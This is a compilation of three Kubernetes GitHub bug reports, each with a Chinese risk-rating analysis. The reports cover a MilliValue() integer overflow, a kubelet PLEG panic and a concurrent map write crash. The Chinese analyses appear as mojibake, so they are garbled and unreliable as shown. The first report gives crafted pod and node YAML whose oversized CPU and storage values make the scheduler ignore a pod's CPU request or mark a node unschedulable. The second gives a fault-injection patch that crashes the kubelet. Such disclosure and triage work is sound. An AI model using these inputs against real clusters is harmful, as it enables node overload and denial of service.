åœ¨è¯¥é—®é¢˜ä¸­ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºPodå’ŒPVCçš„æƒé™æ‰èƒ½å®æ–½æ”»å‡»ï¼Œå› æ­¤é£é™©è¯„çº§åº”ä¸ºä½é£é™©ã€‚

---

## Issue #128684 No overflow validation when using MilliValue()

- Issue é“¾æ¥ï¼š[#128684](https://github.com/kubernetes/kubernetes/issues/128684)

### Issue å†…å®¹

#### What happened?

There is a function called [`MilliValue()`](https://github.com/kubernetes/kubernetes/blob/b5e64567958aae5c2e5befae000d3186384c151b/staging/src/k8s.io/apimachinery/pkg/api/resource/quantity.go#L817C1-L822C1) to represent values in milli units and its comment says "this could **overflow** an int64;  if that's a concern, call `Value()` first to verify the number is small enough." 
```go
// staging/src/k8s.io/apimachinery/pkg/api/resource/quantity.go
// MilliValue returns the value of ceil(q * 1000); this could overflow an int64;
// if that's a concern, call Value() first to verify the number is small enough.
func (q *Quantity) MilliValue() int64 {
	return q.ScaledValue(Milli)
}
```
But actually almost [all call to this function](https://github.com/search?q=repo%3Akubernetes%2Fkubernetes%20MilliValue&type=code) don't verify the number is small enough first.

Here are a few unexpected behaviors caused by this overflow.

#### 1. Pod with extremely large cpu request is treated as with 0 cpu request
**Trigger**: create a pod using the following yaml file, with the cpu resource request is set as a very large quantity.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod
  namespace: default
spec:
  containers:
  - name: test-container
    image: nginx
    resources:
      limits:
        cpu: 16Pi
      requests:
        cpu: 16Pi
# 16Pi = 2^4*2^50 = 2^54, 16Pi * 1000 > 2*63 > 2^63 - 1 = maxInt64, so represent this value in milli unit will cause a overflow
```

**Consequence:** The scheduler will treat this pod with 0 cpu request, so it can be scheduled to any nodes ignoring the node's cpu resource usage. 

**Cause**:  [type.go](https://github.com/kubernetes/kubernetes/blob/a28f14089cfa47ef9c57f9f283e1504a68f616d6/pkg/scheduler/framework/types.go#L854C1-L873C2)
The `noderesource` scheduler plugin uses `SetMaxResource()` to pre-calculate the pod resource request.
```go
// SetMaxResource compares with ResourceList and takes max value for each Resource.
func (r *Resource) SetMaxResource(rl v1.ResourceList) {
	if r == nil {
		return
	}

	for rName, rQuantity := range rl {
		switch rName {
		case v1.ResourceMemory:
			r.Memory = max(r.Memory, rQuantity.Value())
		case v1.ResourceCPU:
->			r.MilliCPU = max(r.MilliCPU, rQuantity.MilliValue())
		case v1.ResourceEphemeralStorage:
			r.EphemeralStorage = max(r.EphemeralStorage, rQuantity.Value())
		default:
			if schedutil.IsScalarResourceName(rName) {
				r.SetScalar(rName, max(r.ScalarResources[rName], rQuantity.Value()))
			}
		}
	}
}
```
1. In `SetMaxResource()`, calling `.MilliValue()` directly on a large `Quantity` without first validating it's small enough will lead to an overflow, causing `rQuantity.MilliValue()` to return a negative number.

2. `SetMaxResource()` iteratively compares the provided value with the existing one and retains the larger value (likely designed to handle cases that a resource is specified multiple times, retain the largest one). 
In this case, the CPU request is specified only once, and the default request value is `0`. 
Therefore, `max(0, negative_number)` returns `0`, resulting in the `noderesource` plugin considers this pod's cpu request is 0.

#### 2. Pod with extremely large memory / ephemeral-storage request will trigger an unexpected warning
**Trigger**: create a pod using the following yaml file, with the ephemeral-storage resource request is a very large quantity.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx-pod
spec:
  containers:
  - name: nginx
    image: nginx:latest
    resources:
      requests:
        ephemeral-storage: 9Pi
      limits:
        ephemeral-storage: 9Pi

```
**Consequence:** When creating this pod, 
It's obvious here `9Pi` is an integer, but Kubernetes will output a confusing warning message: `fractional byte value "9Pi" is invalid, must be an integer.`
**Cause**:  [warning.go](https://github.com/kubernetes/kubernetes/blob/175a5b9c4690c63b7d41c3c295402269780b3a27/pkg/api/pod/warnings.go#L237C3-L248C4)
```go
if value, ok := c.Resources.Limits[api.ResourceMemory]; ok && value.MilliValue()%int64(1000) != int64(0) {
    warnings = append(warnings, fmt.Sprintf("%s: fractional byte value %q is invalid, must be an integer", p.Child("resources", "limits").Key(string(api.ResourceMemory)), value.String()))
}
```
Because the quantity is very quite, calling `value.MilliValue()` will overflow and return a value that cannot be modded by 1000, triggers the warning.

#### 3. Node with extremely large allocatable cpu becomes unschedulable.
**Trigger**: create a node using the following yaml file (in [KWOK](https://kwok.sigs.k8s.io/)), with the allocatable cpu resource is a very large quantity.
```yaml
apiVersion: v1
kind: Node
metadata:
  name: node-1
  namespace: default
status:
  allocatable:
    cpu: 1000Pi
  capacity:
    cpu: 1000Pi
```
**Consequence:** The node will be created but the scheduler thinks its allocatable cpu resource is negative, making this node unschedulable to any pod.

**Cause:** [types.go](https://github.com/kubernetes/kubernetes/blob/2caf4eddd8fc1ab7236ed608c1b548404dbc6bcf/pkg/scheduler/framework/types.go#L799C1-L820C2)
```go
// NewResource creates a Resource from ResourceList
func NewResource(rl v1.ResourceList) *Resource {
	r := &Resource{}
	r.Add(rl)
	return r
}

// Add adds ResourceList into Resource.
func (r *Resource) Add(rl v1.ResourceList) {
	if r == nil {
		return
	}

	for rName, rQuant := range rl {
		switch rName {
		case v1.ResourceCPU:
->			r.MilliCPU += rQuant.MilliValue()
		case v1.ResourceMemory:
			r.Memory += rQuant.Value()
		case v1.ResourcePods:
			r.AllowedPodNumber += int(rQuant.Value())
		case v1.ResourceEphemeralStorage:
			r.EphemeralStorage += rQuant.Value()
		default:
			if schedutil.IsScalarResourceName(rName) {
				r.AddScalar(rName, rQuant.Value())
			}
		}
	}
}
```
The call to `MilliValue` at the pointed line will cause an overflow, making the node's CPU resource negative. And `nodereourse` scheduler plugin will conclude this node is ineligible for any pod.


#### What did you expect to happen?

Although it's unlikely that we will encounter these extremely large values in real world, there is no constraint on the range of this value. Therefore we expect no overflow happens regardless of the user's input.

1. Since most calls to `MilliValue()` do not verify that the number is small enough first, we think the simplest fix might be let `MilliValue()` or `ScaledValue()` handle overflow automatically. For example, capping the return value at maxInt64 when overflow occurs.

2. Another possible fix can be to add a range constraint of [MaxMilliValue](https://github.com/kubernetes/kubernetes/blob/847be850000a902bcd82fb4a02bada5d948595a0/staging/src/k8s.io/apimachinery/pkg/api/resource/math.go#L49) for values will be interpreted as milli unit.


#### How can we reproduce it (as minimally and precisely as possible)?

Use the yaml file above.


#### Anything else we need to know?

/sig scheduling api-machinery

#### Kubernetes version

1.31.2

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŒ‡å‡ºäº†Kubernetesåœ¨å¤„ç†èµ„æºæ•°é‡ï¼ˆQuantityï¼‰æ—¶ï¼Œå½“èµ„æºè¯·æ±‚å€¼éå¸¸å¤§æ—¶ï¼Œä¼šå¯¼è‡´æ•´æ•°æº¢å‡ºï¼Œè¿›è€Œå¼•å‘è°ƒåº¦å™¨çš„å¼‚å¸¸è¡Œä¸ºã€‚ä¾‹å¦‚ï¼Œåˆ›å»ºä¸€ä¸ªCPUè¯·æ±‚å€¼éå¸¸å¤§çš„Podï¼Œå¯èƒ½è¢«è°ƒåº¦å™¨è®¤ä¸ºCPUè¯·æ±‚ä¸º0ï¼Œä»è€Œè°ƒåº¦åˆ°ä»»ä½•èŠ‚ç‚¹ï¼Œå¯èƒ½å¯¼è‡´èŠ‚ç‚¹è¿‡è½½ã€‚ç„¶è€Œï¼Œåˆ©ç”¨æ­¤é—®é¢˜éœ€è¦æ”»å‡»è€…å…·æœ‰åˆ›å»ºæˆ–ä¿®æ”¹Podæˆ–èŠ‚ç‚¹çš„æƒé™ï¼Œå³éœ€è¦å…·å¤‡éåªè¯»æƒé™ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ä¸­çš„ç¬¬4æ¡ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚å› æ­¤ï¼Œæ­¤é—®é¢˜è™½ç„¶å­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†é£é™©è¯„çº§åº”ä¸ºä½é£é™©ã€‚

---

## Issue #128654 kubelet evented panic when use generic pleg relisting 

- Issue é“¾æ¥ï¼š[#128654](https://github.com/kubernetes/kubernetes/issues/128654)

### Issue å†…å®¹

#### What happened?

kubelet evented panic when use generic pleg relistingï¼Œthe log is like:
```
Oct 21 06:03:47  kubelet[1530]: E1021 06:03:47.241522    1530 remote_runtime.go:550] "ListContainers with filter from runtime service failed" err="rpc error: code = DeadlineExceeded desc = context deadline exceeded" filter="&ContainerFilter{Id:,State:nil,PodSandboxId:,LabelSelector:map[string]string{},}"
Oct 21 06:03:48  kubelet[1530]: E1021 06:03:48.844680    1530 remote_runtime.go:550] "ListContainers with filter from runtime service failed" err="rpc error: code = DeadlineExceeded desc = context deadline exceeded" filter="&ContainerFilter{Id:,State:nil,PodSandboxId:,LabelSelector:map[string]string{},}"
Oct 21 06:03:48  kubelet[1530]: E1021 06:03:48.844719    1530 resource_metrics.go:118] "Error getting summary for resourceMetric prometheus endpoint" err="failed to list pod stats: failed to list all containers: rpc error: code = DeadlineExceeded desc = context deadline exceeded"
Oct 21 06:03:51  kubelet[1530]: E1021 06:03:51.478833    1530 evented.go:356] "Evented PLEG: Get cache" err="rpc error: code = DeadlineExceeded desc = context deadline exceeded" podID=3c55a6f7-4909-4cc8-a48c-c534a6b94304
Oct 21 06:03:53  kubelet[1530]: E1021 06:03:51.580766    1530 runtime.go:78] Observed a panic: "invalid memory address or nil pointer dereference" (runtime error: invalid memory address or nil pointer dereference)
Oct 21 06:03:53  kubelet[1530]: goroutine 369 [running]:
Oct 21 06:03:53  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime.logPanic(0x43ea9e0, 0x77e53c0)
Oct 21 06:03:53  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:74 +0x95
Oct 21 06:03:53  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime.HandleCrash(0x0, 0x0, 0x0)
Oct 21 06:03:53  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:48 +0x86
Oct 21 06:03:53  kubelet[1530]: panic(0x43ea9e0, 0x77e53c0)
Oct 21 06:03:53  kubelet[1530]: /usr/local/go/src/runtime/panic.go:965 +0x1b9
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).updateRunningPodMetric(0xc000a18a00, 0xc0011af950)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:359 +0x7d
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).processCRIEvents(0xc000a18a00, 0xc0010ba840)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:251 +0x3b2
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).watchEventsChannel(0xc000a18a00)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:206 +0xec
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0xc00181e0a0)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:155 +0x5f
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc00181e0a0, 0x53f5b20, 0xc0014981e0, 0x1, 0xc00212a120)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:156 +0x9b
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc00181e0a0, 0x0, 0x0, 0x1, 0xc00212a120)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +0x98
Oct 21 06:03:54  kubelet[1530]: k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait.Until(0xc00181e0a0, 0x0, 0xc00212a120)
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:90 +0x4d
Oct 21 06:03:54  kubelet[1530]: created by k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).Start
Oct 21 06:03:54  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:124 +0x148
Oct 21 06:04:48  kubelet[1530]: panic: send on closed channel
Oct 21 06:04:48  kubelet[1530]: goroutine 403 [running]:
Oct 21 06:04:49  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/cri/remote.(*remoteRuntimeService).GetContainerEvents(0xc00081ea20, 0xc0010ba840, 0x0, 0x1)
Oct 21 06:04:49  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/cri/remote/remote_runtime.go:1230 +0x198
Oct 21 06:04:49  kubelet[1530]: k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).watchEventsChannel.func1(0xc000a18a00, 0xc0010ba840)
Oct 21 06:04:49  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:195 +0x69
Oct 21 06:04:49  kubelet[1530]: created by k8s.io/kubernetes/pkg/kubelet/pleg.(*EventedPLEG).watchEventsChannel
Oct 21 06:04:49  kubelet[1530]: /go/src/k8s.io/kubernetes/_output/dockerized/go/src/k8s.io/kubernetes/pkg/kubelet/pleg/evented.go:180 +0xac
Oct 21 06:04:48  systemd[1]: kubelet.service: main process exited, code=exited, status=2/INVALIDARGUMENT
Oct 21 06:04:48  systemd[1]: Unit kubelet.service entered failed state.
Oct 21 06:04:48  systemd[1]: kubelet.service failed.
```

#### What did you expect to happen?

kubelet not panic

#### How can we reproduce it (as minimally and precisely as possible)?

It's hard to reproduce the rpc call "context deadline exceeded" timeout situation, So I added some codes in kubelet to construct this.
1. add the patch for kubelet
```
 pkg/kubelet/cri/remote/remote_runtime.go       | 8 ++++++++
 pkg/kubelet/kuberuntime/kuberuntime_manager.go | 5 +++++
 2 files changed, 13 insertions(+)

diff --git a/pkg/kubelet/cri/remote/remote_runtime.go b/pkg/kubelet/cri/remote/remote_runtime.go
index 424824467b5..d48d6cffb7a 100644
--- a/pkg/kubelet/cri/remote/remote_runtime.go
+++ b/pkg/kubelet/cri/remote/remote_runtime.go
@@ -1206,6 +1206,7 @@ func (r *remoteRuntimeService) CheckpointContainer(options *runtimeapi.Checkpoin
 	return nil
 }

+var eventErrored bool = false
 func (r *remoteRuntimeService) GetContainerEvents(containerEventsCh chan *runtimeapi.ContainerEventResponse) error {
 	containerEventsStreamingClient, err := r.runtimeClient.GetContainerEvents(context.Background(), &runtimeapi.GetEventsRequest{})
 	if err != nil {
@@ -1227,6 +1228,13 @@ func (r *remoteRuntimeService) GetContainerEvents(containerEventsCh chan *runtim
 			return err
 		}
 		if resp != nil {
+			if !eventErrored {
+				if resp.PodSandboxStatus != nil && resp.PodSandboxStatus.Metadata != nil &&
+					resp.PodSandboxStatus.Metadata.Name == "centos7-pod" {
+					eventErrored = true
+					return errors.New("test error")
+				}
+			}
 			containerEventsCh <- resp
 			klog.V(4).InfoS("container event received", "resp", resp)
 		}
diff --git a/pkg/kubelet/kuberuntime/kuberuntime_manager.go b/pkg/kubelet/kuberuntime/kuberuntime_manager.go
index 1c5e545fa9d..f10263c43ce 100644
--- a/pkg/kubelet/kuberuntime/kuberuntime_manager.go
+++ b/pkg/kubelet/kuberuntime/kuberuntime_manager.go
@@ -1040,6 +1040,7 @@ func (m *kubeGenericRuntimeManager) GeneratePodStatus(event *runtimeapi.Containe
 	}, nil
 }

+var errorGetPod bool = false
 // GetPodStatus retrieves the status of the pod, including the
 // information of all containers in the pod that are visible in Runtime.
 func (m *kubeGenericRuntimeManager) GetPodStatus(uid kubetypes.UID, name, namespace string) (*kubecontainer.PodStatus, error) {
@@ -1073,6 +1074,10 @@ func (m *kubeGenericRuntimeManager) GetPodStatus(uid kubetypes.UID, name, namesp

 	klog.V(4).InfoS("getSandboxIDByPodUID got sandbox IDs for pod", "podSandboxID", podSandboxIDs, "pod", klog.KObj(pod))

+	if pod.Name == "centos7-pod" && errorGetPod == false {
+		errorGetPod = true
+		return nil, errors.New("test2 error")
+	}
 	sandboxStatuses := []*runtimeapi.PodSandboxStatus{}
 	containerStatuses := []*kubecontainer.Status{}
 	timestamp := time.Now()
--
2.39.3 (Apple Git-146)
```
2. create a pod, then the kubelet panic
```

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

kubelet 1.21 with latest evented pleg.


#### Cloud provider

None


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>
 Centos7

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
containerd 1.7
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
ä»Issueå†…å®¹æ¥çœ‹ï¼Œkubeletåœ¨ä½¿ç”¨generic pleg relistingæ—¶å‘ç”Ÿäº†panicï¼Œå¯¼è‡´kubeletæœåŠ¡å´©æºƒã€‚æ—¥å¿—ä¸­æ˜¾ç¤ºå‡ºç°äº†â€œinvalid memory address or nil pointer dereferenceâ€çš„panicï¼Œä»¥åŠâ€œsend on closed channelâ€çš„panicã€‚

ä¸ºäº†å¤ç°è¿™ä¸ªé—®é¢˜ï¼ŒIssueæäº¤è€…ä¿®æ”¹äº†kubeletçš„ä»£ç ï¼Œæ¨¡æ‹Ÿäº†RPCè°ƒç”¨è¶…æ—¶çš„æƒ…å†µï¼Œå¯¼è‡´kubeletå‘ç”Ÿpanicã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…éœ€è¦èƒ½å¤Ÿå¼•å‘kubeletçš„RPCè°ƒç”¨è¶…æ—¶ï¼Œè¿™é€šå¸¸éœ€è¦å¯¹é›†ç¾¤ç½‘ç»œæˆ–kubeletè¿è¡Œç¯å¢ƒæœ‰è¾ƒé«˜çš„æ§åˆ¶æƒé™ã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šç”±äºéœ€è¦é«˜æƒé™æˆ–ç‰¹å®šæ¡ä»¶æ‰èƒ½è§¦å‘ï¼Œä¸”å½±å“èŒƒå›´æœ‰é™ï¼ŒCVSSè¯„åˆ†å¯èƒ½åœ¨Highä»¥ä¸‹ã€‚

4. **åœ¨é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†**ï¼šæ­¤æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™ï¼Œå› æ­¤é£é™©è¯„çº§åº”é™ä½ã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜å¯èƒ½å¯¼è‡´kubeletè¿›ç¨‹å´©æºƒï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Œä½†ç”±äºæ”»å‡»è€…éœ€è¦è¾ƒé«˜æƒé™æˆ–ç‰¹å®šæ¡ä»¶æ‰èƒ½è§¦å‘ï¼Œé£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #128638 kubelet crash: fatal error: concurrent map writes

- Issue é“¾æ¥ï¼š[#128638](https://github.com/kubernetes/kubernetes/issues/128638)

### Issue å†…å®¹

#### What happened?

While looking into three failing E2E tests in https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gci-gce-alpha-enabled-default/1854326383216431104 (an AllAlpha job), I found that Kubelet had crashed ([logs](https://storage.googleapis.com/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gci-gce-alpha-enabled-default/1854326383216431104/artifacts/bootstrap-e2e-minion-group-h288/kubelet.log)):

```
Nov 07 01:09:07.338827 bootstrap-e2e-minion-group-h288 kubelet[1937]: fatal error: concurrent map writes
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: goroutine 29497 [running]:
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/cm/containermap.ContainerMap.Add(...)
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/cm/containermap/container_map.go:36
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/cm/cpumanager.(*manager).AddContainer(0xc0008a5ad0, 0xc002175688, 0xc002d8a780, {0xc002d21ec0, 0x40})
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/cm/cpumanager/cpu_manager.go:276 +0x165
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/cm.(*internalContainerLifecycleImpl).PreStartContainer(0xc000a2a060, 0xc002175688, 0xc002d8a780, {0xc002d21ec0, 0x40})
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/cm/internal_container_lifecycle.go:42 +0x42
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/kuberuntime.(*kubeGenericRuntimeManager).startContainer(0xc0009c4180, {0x334ff38, 0xc001184050}, {0xc0017ab600, 0x40}, 0xc000323420, 0xc0026aad58, 0xc002175688, 0xc002856c60, {0x4de4ae0, ...}, ...)
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/kuberuntime/kuberuntime_container.go:271 +0xcdb
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/kuberuntime.(*kubeGenericRuntimeManager).SyncPod.func1({0x334ff38, 0xc001184050}, {0x2e91ac3, 0x9}, {0x2e91ac3, 0x9}, 0xc0026aad58)
Nov 07 01:09:07.342609 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/kuberuntime/kuberuntime_manager.go:1249 +0x8c7
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet/kuberuntime.(*kubeGenericRuntimeManager).SyncPod(0xc0009c4180, {0x334ff38, 0xc001184050}, 0xc002175688, 0xc002856c60, {0x4de4ae0, 0x0, 0x0}, 0xc00095f220)
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/kuberuntime/kuberuntime_manager.go:1318 +0x37d9
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).SyncPod(0xc000431008, {0x334ff00, 0xc001133860}, 0x2, 0xc002175688, 0x0, 0xc002856c60)
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/kubelet.go:2000 +0x1923
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop.func1({0x0, {0x2, {0xc1c322abaa0c010a, 0x7267b7d9ca, 0x4dc1f60}, 0xc002175688, 0x0, 0x0, 0x0}}, 0xc000ad6960, ...)
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/pod_workers.go:1286 +0x1ca
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc000ad6960, {0xc000e53bc0, 0x24}, 0xc002574150)
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/pod_workers.go:1291 +0x49b
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/pod_workers.go:950 +0x118
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]: created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 250
Nov 07 01:09:07.344799 bootstrap-e2e-minion-group-h288 kubelet[1937]:         k8s.io/kubernetes/pkg/kubelet/pod_workers.go:945 +0x20db
```

#### What did you expect to happen?

No crash.

#### How can we reproduce it (as minimally and precisely as possible)?

Don't know, but we have logs from a prow job that encountered it. It's possible that this crash requires a particular alpha feature gate, since this was an AllAlpha job.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
```
v1.32.0-beta.0.205+4c487b00afb20b
```
</details>

#### Cloud provider

<details>
GCE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
ä»Issueçš„å†…å®¹æ¥çœ‹ï¼Œkubeletåœ¨å¤„ç†è¿‡ç¨‹ä¸­å‘ç”Ÿäº†å´©æºƒï¼Œé”™è¯¯ä¿¡æ¯æ˜¯â€œfatal error: concurrent map writesâ€ã€‚è¿™è¡¨ç¤ºåœ¨å¹¶å‘æƒ…å†µä¸‹å¯¹mapè¿›è¡Œäº†å†™æ“ä½œï¼Œå¯¼è‡´äº†Goè¯­è¨€çš„è¿è¡Œæ—¶é”™è¯¯ã€‚

è¿™ç§å´©æºƒå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç‰¹å®šæ‰‹æ®µè§¦å‘kubeletçš„è¿™ä¸ªå¹¶å‘å†™å…¥é”™è¯¯ï¼Œå¯èƒ½å¯¼è‡´kubeletæœåŠ¡å´©æºƒï¼Œä»è€Œå½±å“èŠ‚ç‚¹ä¸Šçš„å®¹å™¨ç®¡ç†å’Œè°ƒåº¦åŠŸèƒ½ã€‚

